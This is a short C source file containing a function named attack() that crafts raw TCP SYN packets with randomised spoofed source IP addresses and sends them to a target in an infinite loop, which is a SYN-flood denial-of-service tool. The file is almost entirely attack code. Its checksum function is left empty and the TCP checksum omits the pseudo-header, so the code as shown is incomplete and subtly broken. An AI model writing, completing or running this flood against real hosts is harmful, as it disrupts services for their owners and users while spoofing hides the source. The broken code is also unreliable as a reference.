#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

unsigned short check_sum(unsigned short *addr, int len) {
  
}

void attack(int skfd, struct sockaddr_in *target, unsigned short srcport) {
  char buf[128] = {0};
  struct ip *ip;
  struct tcphdr *tcp;
  int ip_len;

  ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
  ip = (struct ip*) buf;

  ip -> ip_v = IPVERSION;
  ip -> ip_hl = sizeof(struct ip) >> 2;
  ip -> ip_tos = 0;
  ip -> ip_len = htons(ip_len);
  ip -> ip_id = 0;
  ip -> ip_off = 0;
  ip -> ip_ttl = MAXTTL;
  ip -> ip_p = IPPROTO_TCP;
  ip -> ip_sum = 0;
  ip -> ip_dst = target -> sin_addr;

  tcp = (struct tcphdr*)(buf + sizeof(struct ip));
  tcp -> source = htons(srcport);
  tcp -> dest = target -> sin_port;
  tcp -> seq = random();
  tcp -> doff = 5;
  tcp -> syn = 1;
  tcp -> check = 0;

  while(1) {
    ip -> ip_src.s_addr = random();
    tcp -> check = check_sum((unsigned short*)tcp, sizeof(struct tcphdr));
    sendto(skfd, buf, ip_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_in));
  }
}
